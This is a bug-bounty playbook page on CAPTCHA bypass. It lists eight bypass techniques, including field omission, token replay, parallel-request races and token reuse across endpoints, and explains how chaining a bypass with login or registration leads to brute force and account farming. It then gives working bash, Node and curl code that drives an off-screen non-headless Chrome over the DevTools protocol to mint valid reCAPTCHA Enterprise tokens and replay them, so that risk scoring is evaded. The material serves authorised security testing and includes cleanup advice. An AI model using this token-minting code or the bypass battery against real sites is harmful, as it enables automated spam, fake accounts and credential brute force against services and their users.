# Moraa — CAPTCHA bypass

> Sourced from elementalsouls/Claude-BugHunter `hunt-captcha-bypass`. Cross-ref [[rate-limit-bypass]]
> (this is what a broken CAPTCHA unlocks), [[2fa-bypass]] (same "gate that isn't really enforced" pattern).

## The battery (try in order — cheapest first)
| # | Technique | How |
|---|---|---|
| 1 | **Omit the field entirely** | `POST /register {email,password}` — no `g-recaptcha-response`/`captcha_token` field at all. Most common miss. |
| 2 | **Empty/null/zero value** | `captcha=` / `captcha=null` / `captcha=0` / `captcha=undefined` — tests presence-check vs content-check |
| 3 | **Token replay** | Solve once, submit the SAME token twice in quick succession — if both succeed, no single-use enforcement |
| 4 | **Alternate endpoint skips it** | The web form has a CAPTCHA; does `/api/register` (mobile/API path) for the SAME action? |
| 5 | **Concurrent-request race** | Some implementations count arrivals, not validated outcomes — fire N requests in PARALLEL (not sequentially) to blow past a sliding-window/counter check before it updates |
| 6 | **Reactive threshold** | CAPTCHA only appears after N failures — the first N-1 attempts per account/session bypass it entirely; reset state (new IP/session) and repeat |
| 7 | **Weak custom CAPTCHA** | Simple math (`3+4=?`), tiny finite answer set, weak image OCR — don't bother trying to defeat real Google/hCaptcha programmatically, only weak home-rolled ones |
| 8 | **Token not bound to session/action** | Solve a CAPTCHA on the LOGIN form, submit that token to the REGISTRATION endpoint instead — if accepted, it's validated for truthiness only, not scoped |

## Proof standard
A real state-changing action succeeds (account created, login accepted, form processed) with **no
valid CAPTCHA token** attached to that specific request.

## Impact escalation (this is what makes it worth reporting)
Standalone bypass = Medium. Chained:
- **+ login** → brute-force at scale ([[rate-limit-bypass]]) → High/Critical
- **+ registration** → account farming / spam / resource exhaustion
- **+ password reset** → reset-token flood, chain with [[host-header]] Phase 1 for full ATO

---

## When the CAPTCHA is NOT the bug — mint a real token so you can test what's behind it

Most of the time on a mature target the whole battery above fails, and the CAPTCHA stops being the
target: it's just a **wall in front of the endpoint you actually want to test** (mass assignment,
author/identity spoofing, stored XSS, IDOR on a create route). A human attacker walks through a
reCAPTCHA v3/Enterprise gate for free — they just use the site — so a CAPTCHA that only blocks
*your curl* is not a security control for authz bugs, and you must not let it end the assessment.
Mint a legitimate token and keep hunting.

### Key finding: headless Chrome tokens VERIFY but FAIL the risk assessment
reCAPTCHA **Enterprise** (and v3) return a token from any browser, but the server calls
`createAssessment` and reads `score` / `action` / `valid`. A `--headless=new` Chrome scores at the
floor and gets rejected. The *same script* driving a **windowed (non-headless) Chrome parked
off-screen** passes. This was the difference between 403 and 200 on a real engagement
(learn.acme.example, the vendor, 2026-09).

```bash
# 1) Launch a REAL (non-headless) Chrome, off-screen, with a throwaway profile + CDP port.
#    --headless=new will get you a low-score token that the server rejects. Do not use it.
"/c/Program Files/Google/Chrome/Application/chrome.exe" \
  --disable-gpu --no-first-run --no-default-browser-check \
  --window-position=-32000,-32000 --window-size=1280,900 \
  --remote-debugging-port=9223 --user-data-dir="%TEMP%\cdpprof2" \
  "https://TARGET/page-that-loads-the-sitekey" &
```

```js
// 2) mint.js — Node 21+ only (global WebSocket, no npm install, no puppeteer needed).
//    node mint.js  ->  prints TOKEN=...   (valid ~2 min, single use)
const CDP='http://127.0.0.1:9223';
const SITEKEY='6Lxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';   // grep it out of the JS bundle
const ACTION='submitComment';                       // the action string from the bundle — must match
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
(async()=>{
  let t;
  for(let i=0;i<30;i++){ try{ const l=await (await fetch(CDP+'/json/list')).json();
    t=l.find(x=>x.type==='page'&&x.url.includes('TARGET')); if(t) break; }catch{} await sleep(1000); }
  const ws=new WebSocket(t.webSocketDebuggerUrl); let id=0; const p=new Map();
  const send=(m,pr={})=>new Promise(r=>{const i=++id;p.set(i,r);ws.send(JSON.stringify({id:i,method:m,params:pr}));});
  await new Promise(r=>ws.addEventListener('open',r));
  ws.addEventListener('message',e=>{const m=JSON.parse(e.data); if(m.id&&p.has(m.id)){p.get(m.id)(m);p.delete(m.id);}});
  await send('Runtime.enable');
  for(let i=0;i<40;i++){ const r=await send('Runtime.evaluate',
    {expression:'!!(window.grecaptcha&&window.grecaptcha.enterprise)',returnByValue:true});
    if(r.result?.result?.value) break; await sleep(1000); }
  const r=await send('Runtime.evaluate',{awaitPromise:true,returnByValue:true,userGesture:true,
    expression:`new Promise(res=>{grecaptcha.enterprise.ready(()=>{grecaptcha.enterprise.execute(
      ${JSON.stringify(SITEKEY)},{action:${JSON.stringify(ACTION)}}).then(res).catch(e=>res('ERR:'+e))})})`});
  console.log('TOKEN='+r.result?.result?.value); ws.close();
})();
```

```bash
# 3) Mint fresh per request (tokens are single-use + ~2 min TTL) and replay with YOUR session:
TOK=$(node mint.js | sed 's/^TOKEN=//')
curl -s -X POST https://TARGET/api/comments/create \
  -H "Cookie: $SESSION" -H 'Content-Type: application/json' -H "X-Captcha: $TOK" \
  --data-binary @body.json
```

Notes:
- For plain **reCAPTCHA v3** swap `grecaptcha.enterprise.*` → `grecaptcha.*`.
- Sitekey **and** the `action` string both live in the JS bundle — grep
  `grecaptcha.*execute\(` . A wrong `action` fails the assessment even with a good score.
- Non-headless helps most; adding CDP `Input.dispatchMouseEvent` mouse-move/scroll/click before
  `execute()` is cheap insurance but was not required once the browser was windowed.
- Keep the browser alive and re-mint per request rather than relaunching.

### Validation-order oracle — tell "my payload is wrong" from "my token is bad"
Send a **deliberately empty/invalid body with a valid token**. Compare error strings:

| Request | Response | Meaning |
|---|---|---|
| no token | `403 "reCAPTCHA token was not provided"` | presence check only, so far |
| junk token | `403 "Invalid reCAPTCHA token"` | token is verified server-side |
| **valid token + empty body `{}`** | `403 "Couldn't save comment…"` (same generic error as your real payload) | the gate is **before** body validation → you're failing the **score/assessment**, not the payload. Get a better token; stop mutating the body. |
| valid token + empty body | `400 "Invalid request parameters"` | you're **past** the CAPTCHA — any later error is a real signal about your payload |

This one diagnostic saves an hour of blindly mutating a JSON body against a gate that never even
looked at it. Generalises to any pre-flight gate (WAF, licence check, signature check), not just
CAPTCHA.

### Responsible use
You are creating real records on a production system. Post the minimum, tag the content obviously
(`sectest please ignore`), record the returned `id`/`documentId` in the same command, and delete it
immediately via the app's own delete route — then re-`GET` the collection to prove `0` remain.
